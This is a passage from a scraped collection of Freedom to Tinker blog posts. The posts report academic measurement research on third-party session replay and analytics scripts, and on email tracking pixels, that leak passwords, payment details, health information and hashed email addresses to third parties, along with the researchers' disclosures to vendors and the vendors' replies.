to exclude sensitive information from recordings. However, in order for leaks to be avoided, publishers would need to diligently check and scrub all pages which display or accept user information. For dynamically generated sites, this process would involve inspecting the underlying web application’s server-side code. Further, this process would need to be repeated every time a site is updated or the web application that powers the site is changed. A thorough redaction process is actually a requirement for several of the recording services, which explicitly forbid the collection of user data. This negates the core premise of these session replay scripts, who market themselves as plug and play. For example, Hotjar’s homepage advertises: “Set up Hotjar with one script in a matter of seconds” and Smartlook’s sign-up procedure features their script tag next to a timer with the tagline “every minute you lose is a lot of video”. To better understand the effectiveness of these redaction practices, we set up test pages and installed replay scripts from six of the seven companies [3]. From the results of these tests, as well as an analysis of a number of live sites, we highlight four types of vulnerabilities below: 1. Passwords are included in session recordings. All of the services studied attempt to prevent password leaks by automatically excluding password input fields from recordings. However, mobile-friendly login boxes that use text inputs to store unmasked passwords are not redacted by this rule, unless the publisher manually adds redaction tags to exclude them. We found at least one website where the password entered into a registration form leaked to SessionCam, even if the form is never submitted. 2. Sensitive user inputs are redacted in a partial and imperfect way. As users interact with a site they will provide sensitive data during account creation, while making a purchase, or while searching the site. Session recording scripts can use keystroke or input element loggers to collect this data. All of the companies studied offer some mitigation through automated redaction, but the coverage offered varies greatly by provider. UserReplay and SessionCam replace all user input with an equivalent length masking text, while FullStory, Hotjar, and Smartlook exclude specific input fields by type. We summarize the redaction of other fields in the table below. Summary of the automated redaction features for form inputs enabled by default from each company. Filled circle: Data is excluded; Half-filled circle: equivalent length masking; Empty circle: Data is sent in the clear * UserReplay sends the last 4 digits of the credit card field in plain text † Hotjar masks the street address portion of the address field. Automated redaction is imperfect; fields are redacted by input element type or heuristics, which may not always match the implementation used by publishers. For example, FullStory redacts credit card fields with the `autocomplete` attribute set to `cc-number`, but will collect any credit card numbers included in forms without this attribute. The account page of the clothing store Bonobos leaks full credit card details to FullStory. The screenshot of Chrome’s network inspector shows the leaked data being sent letter-by-letter as it is typed. The user’s full credit card number, expiration, CVV number, name, and billing address are leaked on this page. Email address and gift card numbers are among the other types of data leaked on Bonobos site. To supplement automated redaction, several of the session recording companies, including Smartlook, Yandex, FullStory, SessionCam, and Hotjar allow sites to further specify inputs elements to be excluded from the recording. To effectively deploy these mitigations a publisher will need to actively audit every input element to determine if it contains personal data. This is complicated, error prone and costly, especially as a site or the underlying web application code changes over time. For instance, the financial service site fidelity.com has several redaction rules for Clicktale that involve nested tables and child elements referenced by their index. In the next section we further explore these challenges. A safer approach would be to mask or redact all inputs by default, as is done by UserReplay and SessionCam, and allow whitelisting of known-safe values. Even fully masked inputs provide imperfect protection. For example, the masking used by UserReplay and Smartlook leaks the length of the user’s password 3. Manual redaction of personally identifying information displayed on a page is a fundamentally insecure model. In addition to collecting user inputs, the session recording companies also collect rendered page content. Unlike user input recording, none of the companies appear to provide automated redaction of displayed content by default; all displayed content in our tests ended up leaking. Instead, session recording companies expect sites to manually label all personally identifying information included in a rendered page. Sensitive user data has a number of avenues to end up in recordings, and small leaks over several pages can lead to a large accumulation of personal data in a single session recording. For recordings to be completely free of personal information, a site’s web application developers would need to work with the site’s marketing and analytics teams to iteratively scrub personally identifying information from recordings as it’s discovered. Any change to the site design, such as a change in the class attribute of an element containing sensitive information or a decision to load private data into a different type of element requires a review of the redaction rules. As a case study, we examine the pharmacy section of Walgreens.com, which embeds FullStory. Walgreens makes extensive use of manual redaction for both displayed and input data. Despite this, we find that sensitive information including medical conditions and prescriptions are leaked to FullStory alongside the names of users. The above image shows a prescription request for the anti-depressant drug, Zoloft. During the process of creating the request, the name of the prescribed drug is leaked to FullStory [4]. Manual redaction was used to exclude the user’s name, their doctor’s name, and the quantity of medicine from the recording (marked in the image by a striped overlay). However, the user’s full name was leaked earlier in the process (not shown in this image), which allows anyone with access to the recording to associate this prescription with the user’s real identity. Walgreens allows users to enter their “Health History”, which can include other prescriptions and health conditions that may be relevant to prescription requests. During this process, most of the user’s personal and health information are excluded from FullStory’s recording through manual redaction. However, the process leaks the selected medicine and health conditions, the latter of which is shown above. During account signup, Walgreens requires a user to verify their identity by asking a standard set of identity verification questions. The selection options for these questions, which may reveal the user’s personal information, are displayed on the page and are transferred to FullStory. Additionally, the mouse tracking feature of FullStory will likely reveal the user’s selection, even though the radio button selection is redacted. The inclusion of this data in recordings directly contradicts the statement at the top of the page: “Walgreens does not retain this data and cannot access or view your answers”. We do not present the above examples to point fingers at a certain website. Instead, we aim to show that the redaction process can fail even for a large publisher with a strong, legal incentive to protect user data. We observed similar personal information leaks on other websites, including on the checkout pages of Lenovo [5]. Sites with less resources or less expertise are even more likely to fail. 4. Recording services may fail to protect user data. Recording services increase the exposure to data breaches, as personal data will inevitably end up in recordings. These services must handle recording data with the same security practices with which a publisher would be expected to handle user data. We provide a specific example of how recording services can fail to do so. Once a session recording is complete, publishers can review it using a dashboard provided by the recording service. The publisher dashboards for Yandex, Hotjar, and Smartlook all deliver playbacks within an HTTP page, even for recordings which take place on HTTPS pages. This allows an active man-in-the-middle to injecting a script into the playback page and extract all of the recording data. Worse yet, Yandex and Hotjar deliver the publisher page content over HTTP — data that was previously protected by HTTPS is now vulnerable to passive network surveillance. The vulnerabilities we highlight above are inherent to full-page session recording. That’s not to say the specific examples can’t be fixed — indeed, the publishers we examined can patch their leaks of user data and passwords. The recording services can all use HTTPS during playbacks. But as long as the security of user data relies on publishers fully redacting their sites, these underlying vulnerabilities will continue to exist. Does tracking protection help? Two commonly used ad-blocking lists EasyList and EasyPrivacy do not block FullStory, Smartlook, or UserReplay scripts. EasyPrivacy has filter rules that block Yandex, Hotjar, ClickTale and SessionCam. At least one of the five companies we studied (UserReplay) allows publishers to disable data collection from users who have Do Not Track (DNT) set in their browsers. We scanned the configuration settings of the Alexa top 1 million publishers using UserReplay on their homepages, and found that none of them chose to honor the DNT signal. Improving user experience is a critical task for publishers. However it shouldn’t come at the expense of user privacy. End notes: [0] We use the term ‘exfiltrate’ in this series to refer to the third-party data collection that we study. The term ‘leakage’ is sometimes used, but we eschew it, because it suggests an accidental collection resulting from a bug. Rather, our research suggests that while not necessarily malicious, the collection of sensitive personal data by the third parties that we study is inherent in their operation and is well known to most if not all of these entities. Further, there is an element of furtiveness; these data flows are not public knowledge and neither publishers nor third parties are transparent about them. [1] A recent analysis of the company Navistone, completed by Hill and Mattu for Gizmodo, explores how data collection prior to form submission exceeds user expectations. In this study, we show how analytics companies collect far more user data with minimal disclosure to the user. In fact, some services suggest the first party sites simply include a disclaimer in their site’s privacy policy or terms of service. [2] We used OpenWPM to crawl the Alexa top 50,000 sites, visiting the homepage and 5 additional internal pages on each site. We use a two-step approach to detect analytics services which collect page content. First, we inject a unique value into the HTML of the page and search for evidence of that value being sent to a third party in the page traffic. To detect values that may be encoded or hashed we use a detection methodology similar to previous work on email tracking. After filtering out leak recipients, we isolate pages on which at least one third party receives a large amount of data during the visit, but for which we do not detect a unique ID. On these sites, we perform a follow-up crawl which injects a 200KB chunk of data into the page and check if we observe a corresponding bump in the size of the data sent to the third party. We found 482 sites on which either the unique marker was leaked to a collection endpoint from one of the services or on which we observed a data collection increase roughly equivalent to the compressed length of the injected chunk. We believe this value is a lower bound since many of the recording services offer the ability to sample page visits, which is compounded by our two-step methodology. [3] One company (Clicktale) was excluded because we were unable to make the practical arrangements to analyze script’s functionality at scale. [4] FullStory’s terms and conditions explicitly classify health or medical information, or any other information covered by HIPAA as sensitive data and asks customers to “not provide any Sensitive Data to FullStory.” [5] Lenovo.com is another example of a site which leaks user data in session recordings. On the final page of Lenovo’s checkout procedure, the user’s billing, shipping, and payment information is included in the text of the page. This information is thus included in the page source collected by FullStory as part of the recording process. [6] We used the default scripts available to new accounts for 5 of the 6 providers. For UserReplay, we used a script taken from a live site and verified that the configuration options match the most common options found on the web."
"131","2017-09-28","2023-03-24","https://freedom-to-tinker.com/2017/09/28/i-never-signed-up-for-this-privacy-implications-of-email-tracking/","In this post I discuss a new paper that will appear at PETS 2018, authored by myself, Jeffrey Han, and Arvind Narayanan. What happens when you open an email and allow it to display embedded images and pixels? You may expect the sender to learn that you’ve read the email, and which device you used to read it. But in a new paper we find that privacy risks of email tracking extend far beyond senders knowing when emails are viewed. Opening an email can trigger requests to tens of third parties, and many of these requests contain your email address. This allows those third parties to track you across the web and connect your online activities to your email address, rather than just to a pseudonymous cookie. Illustrative example. Consider an email from the deals website LivingSocial (see details of the example email). When the email is opened, client will make requests to 24 third parties across 29 third-party domains.[1] A total of 10 third parties receive an MD5 hash of the user’s email address, including major data brokers Datalogix and Acxiom. Nearly all of the third parties (22 of the 24) set or receive cookies with their requests. In a webmail client the cookies are the same browser cookies used to track users on the web, and indeed many major web trackers (including domains belonging to Google, comScore, Adobe, and AOL) are loaded when the email is opened. While this example email has a large number of trackers relative to the average email in our corpus, the majority of emails (70%) embed at least one tracker. How it works. Email tracking is possible because modern graphical email clients allow rendering a subset of HTML. JavaScript is invariably stripped, but embedded images and stylesheets are allowed. These are downloaded and rendered by the email client when the user views the email.[2] Crucially, many email clients, and almost all web browsers, in the case of webmail, send third-party cookies with these requests. The email address is leaked by being encoded as a parameter into these third-party URLs. When the user opens the email, a tracking pixel from “tracker.com” is loaded. The user’s email address is included as a parameter within the pixel’s URL. The email client here is a web browser, so it automatically sends the tracking cookies for “tracker.com” along with the request. This allows the tracker to create a link between the user’s cookie and her email address. Later, when the user browses a news website, the browser sends the same cookie, and thus the new activity can be connected back to the email address. Email addresses are generally unique and persistent identifiers. So email-based tracking can be used for targeting online ads based on offline activity (say, to shoppers who used a loyalty card linked to an email address) and for linking different devices belonging to the same user. Measuring email tracking at scale. To understand the privacy implications of viewing and interacting with emails we assembled a collection of messages from mailing lists on the top sites.[3] Using OpenWPM, a web measurement platform developed at Princeton, we simulated a user opening each email and clicking links from within a webmail client that loads remote content. We found that 85% of emails in our corpus contain embedded third-party content, and 70% contain resources categorized as trackers by popular tracking-protection lists. Many of these third parties, including 7 of the top 10, also have a large web presence. When “anonymous” web tracking isn’t. About 29% of emails leak the user’s email address to at least one third party when the email is opened, and about 19% of senders sent at least one email that had such a leak. The majority of these leaks (62%) are intentional.[4] If the leaked email address is associated with a tracking cookie, as it would be in many webmail clients, the privacy risk to users is greatly amplified. Since a tracking cookie can be shared with traditional web trackers, email address can allow those trackers to link tracking profiles from before and after a user clears their cookies. If a user reads their email on multiple devices, trackers can use that address as an identifier to link tracking data cross-device. Most of the top leak recipients, including LiveIntent, Acxiom, Conversant Media, and Neustar, are involved in “people-based” marketing. These third parties receive leaked email addresses from between 24 to 68 of the 902 email senders studied. People-based marketing is defined by Acxiom as “the ability to perform targeting and measurement at the level of real people, not just devices, by resolving identity across digital and offline channels.” In other words, it is a term used to describe a set of services which allow marketers to use tracking data collected across any of a user’s devices, as well as offline data, to target that user on any of their devices. As discussed above, this could include offline data such as purchases made using a loyalty card at a grocery store, if that data is available associated with the purchaser’s email address (or a hash of it). While our data does not let us measure how the companies use leaked email addresses they receive when a user views an email, we can get some insight into potential uses by examining their product pages. The marketing materials and privacy policies of the four companies mentioned above detail their use of email addresses for cross-device targeting and/or data onboarding products.[5] Are leaks of hashed email addresses less of a privacy concern? In many cases the leaked email address is hashed; in fact, 68% of all leaks which occur while viewing emails are hashed, one-third of which also include the domain portion of the email address in plaintext. Hashed email is considered by some leak recipients to not be personally identifying information.[6] From a computer science perspective, the claim that a hashed email address is not personally identifying is patently false. When user records in a database are keyed by hashed email address, looking up the record for a given email address is trivial: simply hash it first and look it up (indeed, this is the whole point of storing hashed email addresses at all). What if you have data associated with a hash of an unknown email address and want to recover the original address? It’s surprisingly easy: you can rent a multi-GPU virtual machine for $14.40 an hour[7] , which gives you 73 billion MD5 hash computations per second based on published benchmarks. Modern methods have gotten really good at enumerating plausible sequences of characters and numbers in passwords, and we believe these methods will extend to email addresses. If they do, it would mean that email address hashes can be broken much more efficiently than through brute forcing (i.e., trying all possible combinations of characters). We posit that with a trillion guesses — a cost of 6 US cents — it should be possible to enumerate the majority of email address in use. Additional leaks occur when users click on links in emails. When an email link is clicked the URL is typically handed over to the user’s browser, or to a new tab in the user’s browser, in the case of webmail. Email addresses and other identifiers may be embedded in these links, and may ultimately cause the user’s email address to leak to third-parties on the web. We found that about 11% of links contain requests that leak the user’s email address to a third-party and about 12% of all emails contain such a link. The largest recipients of these leaks are Google, Facebook, and Twitter, and the top recipients overall are very similar to the top third-party trackers on the web. Leaks in link clicks can also allow email trackers to work around privacy protections in emails clients that strip cookies from remote resources (like Apple Mail) or in those that proxy remote resources (like Gmail). Since the clicked link is opened in the user’s browser, the tracker can make the explicit link between the user’s cookie and the leaked email address while the resulting page is loaded. What can users do? All of the privacy risks discussed in our paper stem from remote resources, so users can use mail clients which support blocking images by default to completely avoid the problem. However, that can often result in emails which are unreadable; this is particularly true for marketing emails. Blocking images by default provides complete protection from tracking when emails are viewed, but can often result in unreadable emails. In Section 6.2 of the paper we survey 16 mail clients and find that a patchwork of privacy features are employed, but that no setup offers complete protection from the threats we identify. Mail clients that block cookies by default, like Apple Mail, offer some level of protection. In these clients it’s more difficult for a tracker to track users across mailing lists, since the mail client doesn’t provide a persistent identifier. The same is true for webmail clients which proxy images, like Gmail and Yandex. Content proxying has the added benefit of preventing a tracker from being able to link the browser’s cookies to any identifiers received when an email is opened. Even with the defenses employed by the clients we studied, trackers which receive the user’s leaked email address will continue to be able to track and target users in these clients and on the web. As an example, LiveIntent’s marketing material reassures clients that it will continue to work in Gmail since “targeting is primarily based around the e-mail address’s [sic] MD5 hash”. Regardless of the defenses deployed by the client, control of tracking is handed off to the user’s browser when email links are clicked. We found that the tracking protection lists EasyList and EasyPrivacy reduce the number of email leaks that occur when an email is viewed by 87%. Perhaps the best option for privacy-conscious users today is to use webmail and install tracking protection tools, such as uBlock Origin or Ghostery. Users who want to use a standalone client must find one which supports privacy extensions; of the clients we studied, the only one that supports such extensions is Thunderbird. Having tracking protection tools installed in the browser will also provide protection when email links are clicked. In Section 7 of the paper we prototyped a server-side filtering feature which uses the tracking protection lists to filter the HTML body of emails before they reach the user. We found it to be nearly as effective as a tracking blocker running in the user’s browser. Data, code, and paper release You can read the paper here. We are also releasing the code and data publicly, including the all of the raw and parsed email bodies and crawls of all HTML emails. We hope that this dataset will spur additional research in this area. Interested in hearing more from me? Follow me on Twitter @s_englehardt. Thanks to Arvind Narayanan and Gunes Acar for their helpful comments on this blog post. [1] The full list of third parties embedded in the LivingSocial example email given above are as follows: Parties receiving an MD5 hash of the user’s email address: American List Counsel (alcmpn.com), LiveIntent (liadm.com), Datalogix (nexac.com), Acxiom (rlcdn.com, pippio.com, acxiom-online.com), Criteo (criteo.com, emailretargeting.com), Conversant Media (dotomi.com), V12 Data (v12group.com), VideoAmp (videoamp.com), Neustar (agkn.com), and alocdn.com. With the exception of emailretargeting.com and agkn.com all of the previous domains also set or receive cookies. Additional parties setting or receiving cookies: MediaMath (mathtag.com), TapAd (tapad.com), IPONWEB (bidswitch.net), AOL (advertising.com), Centro (sitescout.com), The Trade Desk (adsrvr.org), Adobe (demdex.net), OpenX (openx.net), comScore (scorecardresearch.com, voicefive.com), Oracle (bluekai.com), Google (doubleclick.net), Realtime Targeting Aps (mojn.com). Third-party domains requested without cookies or email hash: LiveIntent (licasd.com), Google (2mdn.net), Akamai (akamai.net). [2] Unless they are proxied by the user’s email server; of the providers we studied (Section 6.2 in the paper), only Gmail and Yandex do so. [3] Our email corpus was compiled by automatically signing up for mailing lists on the top 14,700 of the Alexa top 1 million sites, in addition to the Alexa top 500 shopping and top 500 news sites. In total, we received 12,618 emails from 902 senders. [4] We classify the intentionality of leaks using the methodology detailed in Section 4.1 of the paper. [5] LiveIntent’s marketing material touts the benefits of email-address-based tracking over cookies. In particular they highlight that email hash allows “Communication with clients across all screens and devices: Unlike the cookie, which represents an anonymous user, the email address represents a known customer. It’s unique to that individual, and remains persistent across all devices, apps and browsers.” Similarly, LiveIntent also explains how targeting users with hashed email addresses allows them to continue to serve targeted ads in Gmail despite Gmail’s image proxy. Neustar’s privacy policy states: “[The onboarding process] allows advertisers to use their offline information about customer preferences (CRM data) … in the online environment. … We use de-identified information such as a hashed email address provided by our advertising client, to create a link between that de-identified CRM data and a Cookie ID, Mobile Advertising ID, or other persistent identifier assigned to a unique but de-identified user. That information can then be used to deliver targeted advertising…”. and “We also create and store linkages between and among household or individual level identifiers such as Cookie IDs, Mobile Advertising IDs, hashed email addresses and/or other persistent IDs that have been assigned to a unique but de-identified user. This process is sometimes called ‘cross device linking’.” Acxiom’s Data Service API supports data queries on an MD5 or SHA1 hash of an email address. Conversant Media’s marketing material implies that they use email address, in addition to purchase data, to match user data across devices. [6] For example, LiveIntent’s privacy policy states: “We may collect identifiers that are used by our advertising partners to identify a specific individual … To de-identify this information, either we or our business partners perform a mathematical process (commonly known as hashing) to convert the information into a code.” [7] A GPU is a type of processor optimized for highly parallel tasks, and is typically used for graphics processing. GPUs can also very efficiently compute hashes. In this post, we provide price quotes for Amazon’s `p2.16xlarge` EC2 cloud instance. Image assets from the Noun Project used in this post: “Browser” by Designify.me, “Database” by Aybige, “Image” by Alfa Design, “HTML File” by Burak Kucukparmaksiz, “Computer Tower” by Melvin."
"132","2018-02-26","2023-03-24","https://freedom-to-tinker.com/2018/02/26/no-boundaries-for-credentials-password-leaks-to-mixpanel-and-session-replay-companies/","In this installment of the “No Boundaries” series we show how wholesale collection of user interactions by third-party analytics and session replay scripts cause inadvertent collection of passwords. By Steve Englehardt, Gunes Acar and Arvind Narayanan Following the recent report that Mixpanel, a popular analytics provider, had been inadvertently collecting passwords that users typed into websites, we took a deeper look [1]. While Mixpanel characterized it as a “bug, plain and simple” — one that it had fixed — we found that: Mixpanel continues to grab passwords on some sites, even with the patched version of its code. The problem is not limited to Mixpanel; also affected are session replay scripts, which we revealed earlier to be scooping up various other types of sensitive information. There is no foolproof way for these third party scripts to prevent password collection, given their intended functionality. In some cases, password collection happens due to extremely subtle interactions between code from different entities. Overall, we think that the approach of third-party scripts collecting the entirety of web pages or form inputs, and attempting to filter out sensitive information is incompatible with user security and privacy. Password leaks are not limited to Mixpanel In our research we found password leaks to four different third-party analytics providers across a number of websites. The sources are numerous: several variants of a “Show Password” feature added by site owners, an unexpected interaction with an unrelated third-party script, unanticipated changes to page structure by browser extensions, and even a bug in privacy tools of one of the analytics libraries. However, the underlying cause is the same: wholesale collection of user input data, with protection provided by set of blacklist-based heuristics to filter password fields. We argue that this heuristic approach is bound to fail, and provide a list of examples in which it does. This summary is provided not as an exhaustive list of all possible vulnerabilities, but rather as examples of how things can go wrong. A detailed description of each vulnerability and the vendor response is available in the Appendix. Show Password features place passwords in unprotected fields Many websites implement mobile-friendly password visibility toggles which make it possible to “unmask” the entered password and check it for errors. In order to implement this, the user’s password must be placed in a field that doesn’t have its “type” property set to “password”, since browsers will automatically mask any text entered into those fields. We found leaks due to several variations of this feature, including to Mixpanel (A.1), to FullStory (A.2), and to SessionCam (A.3). Video showing the inadvertent password collection by Mixpanel: Subtle interactions with unrelated scripts can lead to leaks Sites may include a number of third-party scripts which alter or annotate the page in unexpected ways. In the example given in (A.4), a third-party analytics script from Adobe stored the typed password in a cookie when the password field clicked. On the same page, session replay script from Userreplay collects all cookies, effectively causing the password leak to Userreplay. Bugs in analytics scripts can lead to password leaks that go unnoticed Even in cases where publisher sites take an active role to prevent leaks to third parties, things can go wrong. Passwords were leaking to FullStory (A.5) due to a bug in one of their redaction features. The feature was implemented in a such a way that, when applied to a password input, the password would leak to FullStory, but would not be displayed in the resulting session recording that the publisher could later review. Thus, it would be difficult for a publisher to discover the leak. Browser extensions can alter the page in a way that leads to leaks In their announcement, Mixpanel explained that “[the password leak] could happen in other scenarios where browser plugins (such as the 1Password password manager) and website frameworks place sensitive data into form element attributes.” The problem is not limited to a small set of browser extensions, but rather any extension which alters the page structure. Neither the site owner nor the analytics provider can be expected to anticipate all possible structural changes an extension might perform. As an example, we examined browser extensions which automatically make password fields visible to the user. There are a ton of such extensions, which are collectively used by 120,000+ users. We found that users of the Unmask Password and Show Password Chrome extensions would, on some sites, have their passwords leaked to Mixpanel (A.6) and FullStory (A.7) respectively. In both cases the leaks were caused by a variant of the “Show Password” feature described above. A better look at the Mixpanel’s Autotrack The Autotrack feature allows sites to collect interaction events on a website, like clicks or form interactions, without needing to specify which elements to monitor. The automated collection of all interactions, including values entered into input fields, is the service’s main selling point: if a site owner ever wants to start monitoring a new input field, Mixpanel will already have the complete history of the various inputs provided by the visitors for this field. Autotrack doesn’t appear to be designed to collect sensitive data. Instead, Mixpanel suggests sites can use the service to perform benign analytical tasks, like finding the commonly used search terms. However, sites collect all types of sensitive data through input elements: usernames and passwords, health information, banking information, and so on. Automatically determining which fields are sensitive is a difficult task, and an incorrect classification runs the risk of scooping up the sensitive user data — even if the user never submits the form [6]. Similar to the session replay scripts we studied in the past, Mixpanel implements several heuristics [7] in attempt to automatically exclude specific types of sensitive information from collection. The rules most relevant to password fields are: remove any input field which is of the password type or has a name property (or “id” property, if name does not exist) that contains the substring “pass”. Mixpanel also offers sites the ability to manually exclude parts of the page, which we discuss later in the post. Not a bug, but a broken design Mixpanel attributed the cause of their previous password leak to a change in another third-party library. The third-party library “placed copies of the values of hidden and password fields into the input elements’ attributes, which Autotrack then inadvertently received”. Indeed, the previous version of Autotrack only filtered password fields’ “value” property, which stores the password entered by the user. The attributes of the field, which can be used to add arbitrary metadata about the password field is left unfiltered. The fix deployed by Mixpanel changed this, filtering both the value property and all attributes from password fields. This plugs that specific hole, but as the Testbook example (A.1) shows, sites may handle sensitive data in other ways Mixpanel didn’t predict. “Show Password” feature is commonly implemented by switching the “type” property of the password input field from “password” to “text”. The majority of the leaks examined above were caused by the mobile-friendly “Show Password” option. This feature is commonly implemented by switching the “type” property of the password input field from “password” to “text” (see: 1, 2, 3). The feature can be implemented by the first party directly or by a browser extension. In fact, this is how the Unmask Password extension is implemented, and was the cause of the ECRent password leak (A.6). The third-party scripts we studied don’t filter generic text fields as strictly as password fields. This is also the primary cause of the leaks on Testbook (A.1), PropellerAds (A.2), and johnlewis.com (A.3). It may be tempting to filter passwords stored in generic text fields based on other properties of the input field, such as the name, class, or id. Mixpanel’s relatively simple implementation of this filtering [8] provides a perfect case study of this mitigation: it excludes generic text fields which contain the substring “pass” in their “name” attribute (or “id”, if “name” does not exist). Using our crawl data we found that 15% of the 36,972 total password fields discovered will not match this substring filter. Indeed, the third most frequent password field name attribute “pwd” would be missed, as will common translations of “password”. A word cloud of the 50 most commonly missed terms is given in footnote [9]. Of course Mixpanel’s heuristic could be updated to include these new fields, but that would just continue the game of whack-a-mole. There will inevitably be another password field formatted or handled in a way that this new heuristic fails to handle and user passwords will continue leaking. Manual redaction is not a silver bullet Mixpanel offers developers a way to manually specify fields that should be excluded from collection. Developers can simply add the class `mp-no-track` or `mp-sensitive` to an element to prevent sensitive information leaks. Indeed, this was the solution Mixpanel recommended in their response to our disclosure [3]. At first glance this might seem to mitigate the problems outlined in this post — anything missed by the automatic filtering can simply be manually filtered by the site. However, our research into session replay scripts found that companies repeatedly failed to prevent data leaks through manual redaction. In Mixpanel’s case, redaction feature is will negate the main benefit of Autotrack – collection without a manual review of the fields. We signed up for a Mixpanel account and enabled Autotrack in the dashboard [10]. During the process, we didn’t see any warnings about the risks of Autotrack, nor could we find a way to review all of the collected data. To discover the collected passwords, we needed to manually add an “event probe” to the password field or login form. This may explain why it took over 9 months for a Mixpanel user to discover the inadvertent password collection introduced back in March 2017, despite its presence on 4% of Mixpanel’s projects. Where to go from here? We focus on password fields in this post because they are the most constrained user input and should be the easiest to redact. Despite this, several of the major input scraping scripts are still unable to prevent password leaks. Financial, health, and other sensitive data are often collected using generic “text” fields which may have ambiguous input labels. We expect them even more difficult to filter in an automated way. We show that the indiscriminate collection of form data is a security disaster waiting to happen. We’ve highlighted these risks before, and the analysis included in this post shows that the problem persists. We don’t view these issues as bugs to be fixed, but rather vulnerabilities inherent to this class of analytics scripts. Appendix: Password leaks and disclosures A1. Mixpanel continues to unintentionally collect passwords The Autotrack feature allows sites to collect analytics on form interactions such as when checking out products or signing in to your account. Mixpanel Autotrack normally tries to exclude password fields from the collected data, but the filtering relies on fragile assumptions about page composition and markup. Fig 1. Password collection by Mixpanel on testbook.com. One of the password leaks occurs on testbook.com’s [2] login form when a user makes use of the “Show Password” feature, which causes the user’s password to be displayed in cleartext. Once the user takes a further action, such as editing the password or hiding it again, the password will be collected by Mixpanel. The collection happens regardless of whether the user ultimately submits the login form. We reported the issue to Mixpanel. Their response can be found in [3]. Mixpanel currently lists the Autotrack feature as “on hold”, and appears to have disabled it for new projects. But sites that were already using Autotrack at the time of the incident are not affected by this change. A2. Password collection due to a “Show password” feature: The PropellerAds’ login form contains an invisible text field, which also holds a copy of the typed password. When a user wants to display the password in cleartext, the password field is replaced by the text field. FullStory’s auto exclusion filters fail to recognize the password in the text field, which causes the password to be collected by FullStory. We reported this issue to FullStory and PropellerAds. FullStory responded promptly and said that “[they] are in touch with the customer to ensure that all inappropriate data is deleted and that they update their exclusion rules to comply with our Acceptable Use Policy.” FullStory’s complete response can be found in [4]. Fig 2. Password is collected on PropellerAds’ login form by FullStory. A3. Johnlewis leaks The registration page of the johnlewis.com website implements the “Show password” feature in the same way as PropellerAds: a copy of the password is always stored in an invisible text field, which replaces the password field when users want to show their password. This time session replay script from sessioncam.com fails to filter out passwords in the text field and sends it to its servers. We reported the issue to SessionCam and johnlewis.com. Response from Sessioncam can be found in [5]. On both of these cases (johnlewis.com and propellerads.com) password is grabbed by the session replay scripts even if the user does not make use of the Show/Hide password feature. Fig 3. Password leaks to Sessioncam on johnlewis.com. A4. Password leaks due to interaction with other analytics scripts. Passwords on Capella University’s admission login page leaks due to an unexpected interaction of different third-party scripts. When a user clicks on the password field, Adobe’s Analytics ActivityMap script stores the password in a cookie called “s_sq”. On the same page, session replay script from Userreplay collects and sends all cookies, which effectively cause passwords to be collected by Userreplay. Fig 4. The password stored in the cookies are leaked to Userreplay on Capella.edu website. A5. Password leaks due to a bug in redaction features Fig 5: The WP Engine login page leaks passwords via FullStory’s keystroke logger. We decode the keyCode values sent to FullStory to demonstrate that they match what was typed into the password field. In the screenshot above, we demonstrate how passwords entered on WP Engine’s login page leak to FullStory via their keystroke logger. From what we can tell, this leak is the result of WP Engine taking proactive steps to protect user data. Rather than relying on FullStory’s automatic exclusion of password fields, WP Engine added FullStory’s manual redaction tag (i.e., `fs-hide`) to the field. FullStory’s documentation explains that fields hidden with the `fs-hide` tag will not be visible in recordings, and that “some raw input events (e.g., key and click events) are also redacted when they relate to an excluded element.” Through manual debugging, we observed that the use of `fs-hide` tag changed the way FullStory’s script classifies the password field, eventually causing it to collect the password. Following our disclosure, FullStory promptly fixed the issue and released a security notice to their customers, stating that the bug affected less than 1% of sites. A6. Unmask Password browser extension causes leaks on ECRent Fig 6. Mixpanel will collect passwords on ECrent registration page when the Unmask Password Chrome extension is in use. The password leaks in a base64 encoded query string to Mixpanel. ECrent is a rental platform that was in the Alexa top 10,000 sites at the time of measurement. Mixpanel’s response to this issue was as the follows: “Unfortunately, there’s little we (or the website owners who are our customers) can do to detect if the end user modifies their browser to make unexpected changes to the DOM. In this case, the solution is the same as for the concerns you reported earlier: explicitly blacklist sensitive input fields using the mechanism we provide.” A7. Show Password causes leaks on Lenovo Fig 7. FullStory will inadvertently collect passwords when the Show Password Chrome extension is in use. Similar to the Propeller Ads example above, this extension implements the show password functionality by swapping the current password field with a new cleartext field. The new field is not excluded from FullStory’s recordings — any further edits to the cleartext will cause password to be collected by FullStory. Endnotes We thank Jonathan Mayer for his valuable feedback. [1] Our rationale for publicizing these leaks is not to point fingers at specific first or third parties. Mixpanel, for example, handled their previous password incident quickly and with transparency. These aren’t bugs that need to be fixed, but rather insecure practices that should be stopped entirely. Even if the specific problems highlighted in this post were fixed, we suspect we’d be able to continue to find variants of the same leaks elsewhere. Thankfully these password leaks can’t be exploited publicly, since the analytics data is only available to first parties. Instead, these leaks expose users to an increased risk to data breaches, an increased potential for data access abuse, and to unclear policies regarding data retention and sharing. [2] testbook.com is the 2360th most popular site globally according to Alexa; testbook.com mobile app has 1,000,000 – 5,000,000 downloads. [3] Mixpanel’s complete response: “Thank you for reporting this. Mixpanel takes security very seriously, and values the contributions of researchers to help our customers be more secure. Our Autotrack feature primarily relies upon the type of HTML input fields to determine whether it is sensitive or not. As you’ve noticed, it backstops that with a simple pattern to try to identify cases where a website is collecting sensitive information in non-password/hidden fields. Per our documentation, if a customer is collecting sensitive information in non-password fields, they should explicitly blacklist it for collection[.] ” [4] FullStory’s responses: “Thank you for writing in. We are in touch with the customer to ensure that all inappropriate data is deleted and that they update their exclusion rules to comply with our Acceptable Use Policy. Our Acceptable Use Policy makes clear in straightforward language that our goal is to avoid receiving sensitive data in the first place; we believe such data should never leave the end user’s device. Our engineering team is working on several techniques to do even more to help our customers avoid the sort of mistakes your research has highlighted. We welcome any and all additional effort that helps us protect our customers and their customers’ data.” “Thanks for reaching back out and for sending over both disclosures. While a more complete reply is forthcoming, I wanted to send over a quick update.Our engineers have been actively looking into both disclosures throughout the morning. We expect to ship a code change to address the `.fs-hide` issue momentarily and we’ll be back in touch with a more detailed response to both disclosures after that code change ships.Again, we really appreciate your disclosing these issues to us.” “I wanted to follow up and let you know that we fixed the bug associated with the .fs-hide issue and the fix is currently in production as of 4:00 PM EST this afternoon. HTML elements containing the `.fs-hide` selector will no longer record keystrokes. Further, we changed the functionality of the recording code so that it will no longer record the actual keys alongside keystroke data. Thus, any future regression will not run the risk of subtly sending keystroke data to FullStory. We have followed up with WPEngine and are working to follow up with any other customers who may have been affected by this particular issue. Thanks again for disclosing this issue to us. The level of detail in the disclosure was particularly helpful in bringing clarity to the diagnosis of the problem. Regarding the 